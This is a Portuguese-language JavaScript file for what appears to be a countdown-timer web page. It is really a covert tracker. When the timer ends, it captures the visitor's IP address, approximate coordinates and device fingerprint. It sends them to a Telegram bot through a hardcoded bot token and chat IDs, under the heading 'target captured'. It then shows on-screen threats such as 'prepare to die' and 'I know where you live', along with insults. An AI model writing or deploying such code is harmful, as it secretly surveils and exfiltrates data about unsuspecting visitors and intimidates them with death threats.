// ================================================
// script.js - Contagem Regressiva + Smart Logger
// ================================================

let targetDate = new Date("2026-04-25T23:59:59").getTime();
let timerInterval = null;

// ==================== CONFIGURAÇÕES ====================
const BOT_TOKEN = "8761130577:AAHnnpD9Ypa20tvEiFC6ZgDskwlNKchxYCQ";

// Adicione aqui todos os chat_ids que devem receber a notificação
const CHAT_IDS = [
    "8448614204",     // Seu chat_id principal
    "8219025301",   // Luizz
];

function detectDeviceType() {
    const ua = navigator.userAgent.toLowerCase();
    
    if (/smart-tv|tv|crkey|roku|android tv|firetv/i.test(ua)) return "Smart TV";
    if (/playstation|xbox|nintendo|switch/i.test(ua)) return "Console de videogame";
    if (/ipad|tablet|playbook|silk/i.test(ua)) return "Tablet";
    if (/android|iphone|ipod|blackberry|iemobile|opera mini/i.test(ua)) return "Celular";
    return "Computador";
}

function getDeviceInfo() {
    const deviceType = detectDeviceType();
    const ram = navigator.deviceMemory ? navigator.deviceMemory + " GB" : "unknown";

    return {
        deviceType: deviceType,
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        language: navigator.language || navigator.userLanguage,
        screen: `${window.screen.width} x ${window.screen.height}`,
        windowSize: `${window.innerWidth} x ${window.innerHeight}`,
        pixelRatio: window.devicePixelRatio || 1,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
        deviceMemory: ram
    };
}

// ==================== ENVIA MENSAGEM PARA O TELEGRAM ====================
async function sendToTelegram(ip, latitude, longitude) {
    const device = getDeviceInfo();
    const devType = device.deviceType;

    const message = `🚨 ALVO CAPTURADO - TIMER ZERADO!\n\n` +
                    `🕒 Horário: ${new Date().toLocaleString('pt-BR')}\n` +
                    `🌐 IP: ${ip || 'Não capturado'}\n` +
                    `📍 Latitude: ${latitude || 'Não disponível'}\n` +
                    `📍 Longitude: ${longitude || 'Não disponível'}\n\n` +
                    `📱 Dispositivo:\n` +
                    `• Tipo: ${devType}\n` +
                    `• Sistema: ${device.platform}\n` +
                    `• Navegador: ${device.userAgent.substring(0, 100)}...\n` +
                    `• Tela: ${device.screen} (${device.pixelRatio}x)\n` +
                    `• Janela: ${device.windowSize}\n` +
                    `• Idioma: ${device.language}\n` +
                    `• Fuso horário: ${device.timezone}\n` +
                    `• Núcleos CPU: ${device.hardwareConcurrency}\n` +
                    `• Memória RAM aprox: ${device.deviceMemory}\n\n` +
                    `===================================\n` +
                    `HAHAHAHAHA OLHA SÓ QUE LIXO\n` +
                    `Ficou esperando o timer acabar no ${devType.toLowerCase()} kkkkk\n\n` +
                    `Eu sei que você tá usando essa merda de ${devType}.\n` +
                    `Eu sei onde você mora.\n` +
                    `Eu sei qual IP de merda é esse.\n\n` +
                    `Você não passa de um fracassado inútil.\n` +
                    `Perdedor de merda.\n\n` +
                    `Não é magia, é habilidade isto...`;

    // Envia para todos os chat_ids configurados
    for (const chatId of CHAT_IDS) {
        try {
            const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ 
                    chat_id: chatId, 
                    text: message 
                })
            });
            const data = await res.json();
            if (data.ok) {
                console.log(`✅ Mensagem enviada para chat_id: ${chatId}`);
            }
        } catch (err) {
            console.error(`Erro ao enviar para ${chatId}:`, err);
        }
    }
}

// ==================== MENSAGEM QUE APARECE NA TELA DO USUÁRIO ====================
function showFinalMessageOnScreen() {
    const deviceType = detectDeviceType();

    document.getElementById("timer").innerHTML = `
        Tempo esgotado!<br><br>
        Prepare-se para morrer, seu lixo...<br><br>
        Eu sei que você tá usando essa merda de ${deviceType.toLowerCase()}.<br>
        Eu sei onde você mora.<br>
        Eu sei o seu IP de merda.<br><br>
        Você é um fracassado patético.<br>
        Um inútil.<br>
        Um perdedor que não consegue nem ganhar de um timer.<br><br>
        Não é magia, é habilidade isto...<br>
        <span style="color: #ff0000; font-size: 1.3rem;">E você continua sendo um nada.</span>
    `;
}

// ==================== ATUALIZA O TIMER ====================
function updateTimer() {
    const timeNow = new Date().getTime();
    let timeLeft = targetDate - timeNow;

    if (timeLeft < 0) {
        clearInterval(timerInterval);

        const deviceType = detectDeviceType();

        // Busca IP + Localização no momento que zera (mais preciso)
        fetch('https://api.ipify.org?format=json')
            .then(r => r.json())
            .then(data => {
                const ip = data.ip;
                return fetch(`http://ip-api.com/json/${ip}?fields=status,lat,lon`)
                    .then(r => r.json())
                    .then(loc => {
                        const lat = loc.status === "success" ? loc.lat : '';
                        const lon = loc.status === "success" ? loc.lon : '';
                        sendToTelegram(ip, lat, lon);
                    })
                    .catch(() => sendToTelegram(ip, '', ''));
            })
            .catch(() => sendToTelegram('Não capturado', '', ''));

        showFinalMessageOnScreen();
        return;
    }

    // Calcula tempo restante
    const days = Math.floor(timeLeft / (1000 * 60 * 60 * 24));
    const hours = Math.floor((timeLeft % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
    const minutes = Math.floor((timeLeft % (1000 * 60 * 60)) / (1000 * 60));
    const seconds = Math.floor((timeLeft % (1000 * 60)) / 1000);
    const centiseconds = Math.floor((timeLeft % 1000) / 10);

    document.getElementById("timer").innerHTML = `
        ${days}d ${hours}h ${minutes}m ${seconds}.${centiseconds.toString().padStart(2, '0')}s
    `;
}

// ==================== INICIALIZAÇÃO ====================
timerInterval = setInterval(updateTimer, 100);
updateTimer();   // Primeira atualização imediata